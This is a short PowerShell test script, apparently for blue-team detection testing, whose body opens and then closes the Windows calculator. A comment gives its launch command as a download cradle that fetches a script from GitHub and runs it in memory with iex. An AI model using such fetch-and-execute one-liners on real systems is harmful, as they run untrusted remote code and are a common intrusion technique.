## to be executed as; powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kaywoz/bluestuff/main/powershell/payload-test1.ps1')"

##random
calc.exe
sleep 5
## kill calc
get-process *calc* | stop-process
